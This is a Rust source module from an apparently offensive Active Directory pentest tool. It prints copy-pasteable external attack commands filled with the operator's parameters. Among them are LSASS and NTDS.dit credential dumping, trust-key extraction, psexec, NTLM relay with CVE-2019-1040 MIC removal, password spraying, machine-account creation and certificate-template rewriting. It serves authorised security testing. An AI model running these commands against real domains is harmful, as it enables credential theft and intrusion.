//! `gap_hint` — universal "adhammer has a gap here, use X instead" pattern.
//!
//! **The philosophy** (1.5.1 close review, user-directed): adhammer is not
//! trying to replace `impacket`, `Certipy`, `pypykatz`, `Rubeus`, or
//! `rusthound-ce` for every last capability. Where adhammer is strong (the
//! from-scratch protocol stack + audit-report + a coherent CLI) we ship an
//! end-to-end path. Where we are honestly weak (or the work would violate the
//! S-tier minimalism / dual-use / on-prem-only hard rules) we hand the
//! operator a **copy-pasteable external command with their captured params
//! substituted in.**
//!
//! Emitted at gap sites via [`hint_external`]. Every gap also has a row in
//! `docs/GAPS.md` explaining why we don't do it and what the swap costs.
//!
//! **Format contract** (stable — scripts can grep for `[hint]`):
//! ```text
//! [hint] this step is a known adhammer gap: <one-line rationale>
//! [hint] external tool: <copy-pasteable command with captured params>
//! [hint] see docs/GAPS.md#<anchor> for the full table
//! ```
//! Always to STDERR so `--json` stdout stays pure. Never emitted for a step
//! adhammer completes on its own — only when the operator hit a real bail.

use std::fmt::Write;

/// Every documented gap where adhammer defers to an external tool. Keep this
/// list in sync with `docs/GAPS.md` — [`docs_anchor`] returns the anchor slug
/// used in the "see docs/GAPS.md#..." line.
#[derive(Copy, Clone, Debug, PartialEq, Eq)]
pub(crate) enum Gap {
    /// F1b — LDAPS client-cert (schannel) bind. Blocked on ldap3 client-cert
    /// integration; a workaround is Certipy's native-tls path.
    LdapPfxAuth,
    /// F5 — offline LSASS minidump parse (WDigest / MSV1_0 / TSPKG / Kerberos).
    LsassMinidump,
    /// Out-of-scope for adhammer (not AD/Windows-native): KDBX (KeePass)
    /// master-password crack.
    KdbxCrack,
    /// NTDS.dit offline extraction after `attack secretsdump` when the DC does
    /// not permit `drsuapi` and the operator instead pulled `ntds.dit` from a
    /// backup / vshadow.
    NtdsCrack,
    /// F3 — LSA policy secret dump (`G$$<trust-domain>` cross-realm trust
    /// keys). Blocked on ms-lsad v0.3 (`LsarRetrievePrivateData`).
    TrustDump,
    /// The sealed-RPC `psexec` / `svcctl` path (was cut in 1.4.8 — needs a
    /// Wireshark reference against a working Windows client).
    PsExecSealed,
    /// NTLM-relay with a SOCKS listener — adhammer has `attack relay` but no
    /// SOCKS-out yet.
    NtlmRelaySocks,
    /// BloodHound-CE live collection. adhammer emits a BloodHound-CE-shaped
    /// ZIP from `scan --out ...zip`, but the *live* collector loop is a
    /// separate project (rusthound-ce / SharpHound).
    BloodhoundCollect,
    /// Cert-template DACL ACE edit (grant Enroll to a principal). F2's
    /// `--enrollee` prints a hint; the write isn't wired yet.
    TemplateAceEdit,
    /// The operator passed a `.pfx`; adhammer wants `--key <pem>` +
    /// `--cert <path>` — hand back the `openssl` one-liner to convert.
    PfxDecode,
    /// Pre-Windows-2000 mass spray against `PASSWD_NOTREQD` computer accounts.
    /// Discovered live on external Server-2019 targets — `attack pre2k` lands
    /// in 1.5.2; today the fallback is `nxc smb --pre2k`.
    Pre2kSpray,
    /// Change an expired / pre-created account password over SAMR without a
    /// prior session. `attack changepasswd` (SAMR ChangePassword2) lands in
    /// 1.5.2; today the fallback is `impacket-changepasswd`.
    ExpiredChangepw,
    /// Full MS-PSRP runspace shell. `attack winrm --shell powershell` only
    /// wraps single commands via the WSMan PS-shell URI; Server 2019+ requires
    /// the full PSRP runspace protocol (~500 LOC follow-up in 1.6).
    PsrpRunspace,
    /// HTTP-listener NTLM relay + CVE-2019-1040 (--remove-mic) + auto-RBCD
    /// escalate. `attack relay --listen-http --remove-mic --escalate-user`
    /// lands in 1.5.2 (P0 for that milestone).
    RelayHttpMic,
    /// Create a controlled computer account via MachineAccountQuota to use as
    /// an RBCD trustee. `attack abuse --create-computer` lands in 1.5.2;
    /// today the fallback is `impacket-addcomputer`.
    CreateComputer,
}

/// Optional params captured from the current invocation. Any subset can be
/// populated; unfilled slots render as visible placeholders (`<dc-ip>`).
///
/// `realm` and `target` are declared for future hint-slot expansion (M10
/// cross-realm hints, per-user attack hints) — populated by later gap
/// wirings. Flagged `dead_code` today so strict clippy passes.
#[derive(Default, Debug, Clone)]
#[allow(dead_code)]
pub(crate) struct HintParams {
    pub dc_ip: Option<String>,
    pub dc_host: Option<String>,
    pub domain: Option<String>,
    pub realm: Option<String>,
    pub user: Option<String>,
    pub target: Option<String>,
    pub file: Option<String>,
    pub template: Option<String>,
}

impl HintParams {
    pub(crate) fn new() -> Self {
        Self::default()
    }
}

fn slot<'a>(v: &'a Option<String>, placeholder: &'a str) -> &'a str {
    v.as_deref().unwrap_or(placeholder)
}

/// Print the 3-line hint block for `gap` with `params` substituted. Goes to
/// stderr so JSON stdout stays clean.
pub(crate) fn hint_external(gap: Gap, params: &HintParams) {
    let (rationale, command) = match gap {
        Gap::LdapPfxAuth => (
            "LDAPS client-cert (schannel) bind not wired — ldap3 does not expose \
             a client-cert TLS setter; a workspace TLS-backend switch would be needed.",
            format!(
                "certipy auth -pfx <file.pfx> -dc-ip {dc}",
                dc = slot(&params.dc_ip, "<dc-ip>"),
            ),
        ),
        Gap::LsassMinidump => (
            "offline LSASS minidump parse (WDigest/MSV1_0/TSPKG/Kerberos) is not \
             implemented — dpapi-offline has the crypto but the LSASS walker is \
             per-OS struct-offset work (F5 — deferred).",
            format!(
                "pypykatz lsa minidump {f}",
                f = slot(&params.file, "<lsass.dmp>"),
            ),
        ),
        Gap::KdbxCrack => (
            "KDBX (KeePass) crack is out of scope — not an AD/Windows-native \
             attack surface; belongs in hashcat/john.",
            format!(
                "keepass2john {f} > kdbx.hash && hashcat -m 13400 kdbx.hash <wordlist>",
                f = slot(&params.file, "<file.kdbx>"),
            ),
        ),
        Gap::NtdsCrack => (
            "offline NTDS.dit parse (from a backup / vshadow copy) is not wired \
             in adhammer — `attack secretsdump` does the drsuapi live path.",
            format!(
                "impacket-secretsdump -ntds {ntds} -system <SYSTEM.hive> LOCAL",
                ntds = slot(&params.file, "<ntds.dit>"),
            ),
        ),
        Gap::TrustDump => (
            "LSA policy secret dump (G$$<trust-domain> cross-realm trust key) \
             blocked on ms-lsad v0.3 (`LsarRetrievePrivateData`) — F3 deferred.",
            format!(
                "impacket-lsadump -target-ip {dc} {dom}/{u}",
                dc = slot(&params.dc_ip, "<dc-ip>"),
                dom = slot(&params.domain, "<DOMAIN>"),
                u = slot(&params.user, "<user>"),
            ),
        ),
        Gap::PsExecSealed => (
            "sealed-RPC psexec/svcctl was cut in 1.4.8 (STATUS_PIPE_BUSY, needs a \
             Windows-native Wireshark reference to close).",
            format!(
                "impacket-psexec {dom}/{u}@{host}",
                dom = slot(&params.domain, "<DOMAIN>"),
                u = slot(&params.user, "<user>"),
                host = slot(&params.dc_host, "<target-host>"),
            ),
        ),
        Gap::NtlmRelaySocks => (
            "NTLM-relay with a SOCKS listener isn't in `attack relay` yet — pipe \
             coerced auth to impacket's proxy.",
            "impacket-ntlmrelayx -tf targets.txt -smb2support --socks".to_string(),
        ),
        Gap::BloodhoundCollect => (
            "live BloodHound-CE collector is a separate project — adhammer emits \
             an ingest-compatible ZIP from `scan --out <path>.zip`, but the live \
             collector loop belongs in rusthound-ce / SharpHound.",
            format!(
                "rusthound-ce -d {dom} -u {u} -p '<password>' -c All",
                dom = slot(&params.domain, "<domain.local>"),
                u = slot(&params.user, "<user>"),
            ),
        ),
        Gap::TemplateAceEdit => (
            "granting Enroll on a certificate template via LDAP DACL write \
             isn't wired — F2's `--enrollee` prints this hint (flags alone are \
             usually enough when the template is already broadly enrollable).",
            format!(
                "certipy template -template {tpl} -write-default-configuration",
                tpl = slot(&params.template, "<TemplateName>"),
            ),
        ),
        Gap::PfxDecode => (
            "adhammer takes `--key <pem>` + `--cert <path>`, not `.pfx` — \
             extract with openssl (native `--pfx` support is task #15).",
            format!(
                "openssl pkcs12 -in {f} -nocerts -nodes -out x.key.pem && \
                 openssl pkcs12 -in {f} -clcerts -nokeys -out x.crt",
                f = slot(&params.file, "<file.pfx>"),
            ),
        ),
        Gap::Pre2kSpray => (
            "no dedicated Pre-Win2000 spray verb yet — `attack pre2k` lands \
             in 1.5.2. Today: pass an account list to the external tool.",
            format!(
                "nxc smb {dc} --pre2k -u accounts.txt -p accounts.txt",
                dc = slot(&params.dc_ip, "<dc-ip>"),
            ),
        ),
        Gap::ExpiredChangepw => (
            "SAMR ChangePassword2 (change an expired / pre-created account's \
             password without a prior session) has no CLI verb yet — \
             `attack changepasswd` lands in 1.5.2.",
            format!(
                "impacket-changepasswd {dom}/{u}@{dc} -newpass '<new>'",
                dom = slot(&params.domain, "<DOMAIN>"),
                u = slot(&params.user, "<user>"),
                dc = slot(&params.dc_ip, "<dc-ip>"),
            ),
        ),
        Gap::PsrpRunspace => (
            "`attack winrm --shell powershell` wraps single commands only; \
             Server 2019+ needs the full MS-PSRP runspace protocol (~500 LOC \
             follow-up, 1.6). Today: use the specialist shell.",
            format!(
                "evil-winrm -i {host} -u {u} -p '<password>'",
                host = slot(&params.dc_host, "<target>"),
                u = slot(&params.user, "<user>"),
            ),
        ),
        Gap::RelayHttpMic => (
            "`attack relay` is SMB-listener today; HTTP listener + CVE-2019-1040 \
             MIC bypass + auto-RBCD escalate lands in 1.5.2 (P0). Today: use \
             the specialist relay proxy.",
            format!(
                "impacket-ntlmrelayx -t ldaps://{dc} --http-port 80 \
                 --remove-mic --escalate-user <sam> -smb2support",
                dc = slot(&params.dc_host, "<dc>"),
            ),
        ),
        Gap::CreateComputer => (
            "creating a computer account via MachineAccountQuota (RBCD trustee \
             bootstrap) has no CLI verb yet — `attack abuse --create-computer` \
             lands in 1.5.2.",
            format!(
                "impacket-addcomputer -computer-name '<NAME>$' \
                 -computer-pass '<pw>' -dc-ip {dc} {dom}/{u}:'<password>'",
                dc = slot(&params.dc_ip, "<dc-ip>"),
                dom = slot(&params.domain, "<DOMAIN>"),
                u = slot(&params.user, "<user>"),
            ),
        ),
    };
    let anchor = docs_anchor(gap);
    eprintln!("[hint] this step is a known adhammer gap: {rationale}");
    eprintln!("[hint] external tool: {command}");
    eprintln!("[hint] see docs/GAPS.md#{anchor} for the full table");
}

/// Anchor slug in `docs/GAPS.md` for a gap. Must match the header id there.
fn docs_anchor(gap: Gap) -> &'static str {
    match gap {
        Gap::LdapPfxAuth => "f1b-ldap-pfx-auth",
        Gap::LsassMinidump => "f5-lsass-minidump",
        Gap::KdbxCrack => "kdbx-crack",
        Gap::NtdsCrack => "ntds-dit-offline",
        Gap::TrustDump => "f3-trust-dump",
        Gap::PsExecSealed => "psexec-sealed",
        Gap::NtlmRelaySocks => "ntlm-relay-socks",
        Gap::BloodhoundCollect => "bloodhound-collect",
        Gap::TemplateAceEdit => "template-ace-edit",
        Gap::PfxDecode => "pfx-decode",
        Gap::Pre2kSpray => "pre2k-spray",
        Gap::ExpiredChangepw => "expired-changepw",
        Gap::PsrpRunspace => "psrp-runspace",
        Gap::RelayHttpMic => "relay-http-mic",
        Gap::CreateComputer => "create-computer",
    }
}

/// Human table for `adhammer gaps` (a lightweight `--list` view). Kept
/// alongside `docs/GAPS.md` so a scripted operator can grep it out of
/// stdout without opening a browser.
pub(crate) fn print_gaps_table() {
    let rows: [(Gap, &str); 15] = [
        (Gap::LdapPfxAuth, "LDAPS client-cert bind"),
        (Gap::LsassMinidump, "offline LSASS parse"),
        (Gap::KdbxCrack, "KDBX / KeePass crack"),
        (Gap::NtdsCrack, "offline NTDS.dit crack"),
        (Gap::TrustDump, "LSA trust-key dump (F3)"),
        (Gap::PsExecSealed, "sealed psexec / svcctl"),
        (Gap::NtlmRelaySocks, "NTLM relay + SOCKS"),
        (Gap::BloodhoundCollect, "BloodHound live collect"),
        (Gap::TemplateAceEdit, "cert-template ACE grant"),
        (Gap::PfxDecode, "PFX → PEM+CRT"),
        (Gap::Pre2kSpray, "Pre-Win2000 mass spray"),
        (Gap::ExpiredChangepw, "SAMR ChangePassword2"),
        (Gap::PsrpRunspace, "full PSRP runspace shell"),
        (Gap::RelayHttpMic, "HTTP relay + CVE-2019-1040"),
        (Gap::CreateComputer, "create computer (MAQ)"),
    ];
    let mut w = String::new();
    let _ = writeln!(w, "known gaps → external tool (docs/GAPS.md):");
    for (g, label) in rows {
        let _ = writeln!(w, "  · {label:<32}  see #{}", docs_anchor(g));
    }
    print!("{w}");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_gap_has_an_anchor() {
        // Exhaustively enumerate variants — a new Gap without a docs_anchor
        // arm would fail to compile via `match`; this guards the runtime
        // side (no anchor is the empty string).
        for g in [
            Gap::LdapPfxAuth,
            Gap::LsassMinidump,
            Gap::KdbxCrack,
            Gap::NtdsCrack,
            Gap::TrustDump,
            Gap::PsExecSealed,
            Gap::NtlmRelaySocks,
            Gap::BloodhoundCollect,
            Gap::TemplateAceEdit,
            Gap::PfxDecode,
            Gap::Pre2kSpray,
            Gap::ExpiredChangepw,
            Gap::PsrpRunspace,
            Gap::RelayHttpMic,
            Gap::CreateComputer,
        ] {
            assert!(!docs_anchor(g).is_empty(), "anchor missing for {g:?}");
        }
    }

    #[test]
    fn slot_falls_back_to_placeholder() {
        let none: Option<String> = None;
        let some = Some("real".to_string());
        assert_eq!(slot(&none, "<x>"), "<x>");
        assert_eq!(slot(&some, "<x>"), "real");
    }
}
